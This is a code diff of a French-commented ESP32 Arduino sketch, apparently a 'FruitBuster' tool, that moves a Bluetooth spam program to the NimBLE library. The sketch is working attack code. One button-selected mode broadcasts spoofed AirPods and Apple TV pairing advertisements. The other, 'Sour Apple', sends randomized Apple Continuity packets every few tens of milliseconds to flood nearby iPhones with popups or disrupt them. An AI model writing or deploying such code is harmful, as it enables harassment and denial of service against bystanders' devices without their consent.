@@ -1,30 +1,13 @@
-
 #include <Arduino.h>
-#include <BLEDevice.h>      // Pour le premier code (BLE classique)
-#include <NimBLEDevice.h>   // Pour le deuxième code (NimBLE)
-#include <BLEUtils.h>
-#include <BLEServer.h>
-#include <esp_arduino_version.h>
+#include <NimBLEDevice.h>
 
-// Définitions des broches
-const int boutonBoot = 0;  // GPIO 0 (bouton BOOT)
-const int ledPin = 2;      // GPIO 2 (LED intégrée)
+const int boutonBoot = 0;
+const int ledPin = 2;
 
-// Puissance maximale Bluetooth
-#if defined(CONFIG_IDF_TARGET_ESP32C3) || defined(CONFIG_IDF_TARGET_ESP32C2) || defined(CONFIG_IDF_TARGET_ESP32S3)
-#define MAX_TX_POWER ESP_PWR_LVL_P21  // ESP32C3 ESP32C2 ESP32S3
-#elif defined(CONFIG_IDF_TARGET_ESP32H2) || defined(CONFIG_IDF_TARGET_ESP32C6)
-#define MAX_TX_POWER ESP_PWR_LVL_P20  // ESP32H2 ESP32C6
-#else
-#define MAX_TX_POWER ESP_PWR_LVL_P9   // Default
-#endif
-
-// Variables globales
-BLEAdvertising *pAdvertising;      // Pour le premier code
-NimBLEAdvertising *pNimAdvertising;// Pour le deuxième code
-uint32_t delayMilliseconds = 1000; // Délai pour le premier code
-int mode = 0;                      // 0 = désactivé, 1 = premier code, 2 = deuxième code
-int dernierEtatBouton = HIGH;      // État précédent du bouton pour détection d'appui
+NimBLEAdvertising *pAdvertising;
+uint32_t delayMilliseconds = 1000;
+int mode = 0;
+int dernierEtatBouton = HIGH;
 
 const uint8_t DEVICES[][31] = {
   // Airpods
@@ -92,122 +75,90 @@ const uint8_t SHORT_DEVICES[][23] = {
   {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x24, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
 };
 
-NimBLEAdvertisementData getOAdvertisementData() {
+NimBLEAdvertisementData getSourAppleData() {
   NimBLEAdvertisementData randomAdvertisementData = NimBLEAdvertisementData();
   uint8_t packet[17];
   uint8_t i = 0;
 
-  packet[i++] = 16;    // Longueur du paquet
-  packet[i++] = 0xFF;  // Type (Manufacturer Specific)
-  packet[i++] = 0x4C;  // ID Apple
-  packet[i++] = 0x00;  // ...
-  packet[i++] = 0x0F;  // Type
-  packet[i++] = 0x05;  // Longueur
-  packet[i++] = 0xC1;  // Flags
+  packet[i++] = 16;
+  packet[i++] = 0xFF;
+  packet[i++] = 0x4C;
+  packet[i++] = 0x00;
+  packet[i++] = 0x0F;
+  packet[i++] = 0x05;
+  packet[i++] = 0xC1;
   const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
-  packet[i++] = types[rand() % sizeof(types)];  // Type d'action aléatoire
-  esp_fill_random(&packet[i], 3); // Tag d'authentification
+  packet[i++] = types[rand() % sizeof(types)];
+  esp_fill_random(&packet[i], 3);
   i += 3;
-  packet[i++] = 0x00;  // ???
-  packet[i++] = 0x00;  // ???
-  packet[i++] = 0x10;  // Type ???
+  packet[i++] = 0x00;
+  packet[i++] = 0x00;
+  packet[i++] = 0x10;
   esp_fill_random(&packet[i], 3);
 
-  randomAdvertisementData.addData(std::string((char *)packet, 17));
+  randomAdvertisementData.addData(packet, 17);
   return randomAdvertisementData;
 }
 
 void setup() {
   Serial.begin(115200);
-  Serial.println("Démarrage ESP32 avec BLE");
+  pinMode(boutonBoot, INPUT_PULLUP);
+  pinMode(ledPin, OUTPUT);
+  digitalWrite(ledPin, LOW);
 
-  pinMode(boutonBoot, INPUT_PULLUP); // GPIO 0 avec pull-up interne
-  pinMode(ledPin, OUTPUT);           // LED comme sortie
-  digitalWrite(ledPin, LOW);         // LED éteinte au départ
-
-  BLEDevice::init("AirPods 69");
-  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
-  BLEServer *pServer = BLEDevice::createServer();
-  pAdvertising = pServer->getAdvertising();
-  esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
-  pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
-
-  NimBLEDevice::init("");
+  NimBLEDevice::init("FruitBuster");
   esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
   esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
   esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN, ESP_PWR_LVL_P9);
-  NimBLEServer *pNimServer = NimBLEDevice::createServer();
-  pNimAdvertising = pNimServer->getAdvertising();
+
+  NimBLEServer *pServer = NimBLEDevice::createServer();
+  pAdvertising = pServer->getAdvertising();
 }
 
 void loop() {
   int etatBouton = digitalRead(boutonBoot);
-
   if (etatBouton == LOW && dernierEtatBouton == HIGH) {
-    mode = (mode + 1) % 3; // Passe au mode suivant : 0 -> 1 -> 2 -> 0
-    delay(200); // Anti-rebond simple
+    mode = (mode + 1) % 3;
+    delay(200);
 
     if (mode == 0) {
-      Serial.println("Mode désactivé");
-      digitalWrite(ledPin, LOW); // Éteindre la LED
-      pAdvertising->stop();      // Arrêter BLE classique
-      pNimAdvertising->stop();   // Arrêter NimBLE
+      digitalWrite(ledPin, LOW);
+      pAdvertising->stop();
     } else if (mode == 1) {
-      Serial.println("Mode 1 activé : Simulation AirPods/AppleTV");
-      digitalWrite(ledPin, HIGH); // Allumer la LED en continu
-      pNimAdvertising->stop();    // Arrêter NimBLE si actif
+      digitalWrite(ledPin, HIGH);
+      pAdvertising->stop();
     } else if (mode == 2) {
-      Serial.println("Mode 2 activé : Sour Apple");
-      pAdvertising->stop();       // Arrêter BLE classique si actif
+      pAdvertising->stop();
     }
   }
-  dernierEtatBouton = etatBouton; // Mettre à jour l'état précédent
+  dernierEtatBouton = etatBouton;
 
   if (mode == 1) {
-    // Code du premier mode (AirPods/AppleTV)
-    esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
-    for (int i = 0; i < 6; i++) {
-      dummy_addr[i] = random(256);
-      if (i == 0) dummy_addr[i] |= 0xF0;
-    }
-
-    BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
+    NimBLEAdvertisementData oAdvertisementData = NimBLEAdvertisementData();
     int device_choice = random(2);
     if (device_choice == 0) {
-      int index = random(17); // Ajuste selon le nombre d'éléments dans DEVICES
-      #if ESP_ARDUINO_VERSION >= ESP_ARDUINO_VERSION_VAL(3, 0, 0)
-        oAdvertisementData.addData(String((char*)DEVICES[index], 31));
-      #else
-        oAdvertisementData.addData(std::string((char*)DEVICES[index], 31));
-      #endif
+      int index = random(1);
+      oAdvertisementData.addData(DEVICES[index], 31);
     } else {
-      int index = random(13); // Ajuste selon le nombre d'éléments dans SHORT_DEVICES
-      #if ESP_ARDUINO_VERSION >= ESP_ARDUINO_VERSION_VAL(3, 0, 0)
-        oAdvertisementData.addData(String((char*)SHORT_DEVICES[index], 23));
-      #else
-        oAdvertisementData.addData(std::string((char*)SHORT_DEVICES[index], 23));
-      #endif
+      int index = random(1);
+      oAdvertisementData.addData(SHORT_DEVICES[index], 23);
     }
 
-    int adv_type_choice = random(3);
-    if (adv_type_choice == 0) pAdvertising->setAdvertisementType(ADV_TYPE_IND);
-    else if (adv_type_choice == 1) pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
-    else pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
-
-    pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
     pAdvertising->setAdvertisementData(oAdvertisementData);
     pAdvertising->start();
     delay(delayMilliseconds);
     pAdvertising->stop();
-  } else if (mode == 2) {
+  }
+
+  if (mode == 2) {
     delay(40);
-    NimBLEAdvertisementData advertisementData = getOAdvertisementData();
-    pNimAdvertising->setAdvertisementData(advertisementData);
-    pNimAdvertising->start();
-    digitalWrite(ledPin, HIGH); // Allumer la LED
+    NimBLEAdvertisementData advertisementData = getSourAppleData();
+    pAdvertising->setAdvertisementData(advertisementData);
+    pAdvertising->start();
+    digitalWrite(ledPin, HIGH);
     delay(20);
-    pNimAdvertising->stop();
-    digitalWrite(ledPin, LOW);  // Éteindre la LED
-    delay(20);                  // Clignotement rapide (20 ms ON, 20 ms OFF)
+    pAdvertising->stop();
+    digitalWrite(ledPin, LOW);
+    delay(20);
   }
 }
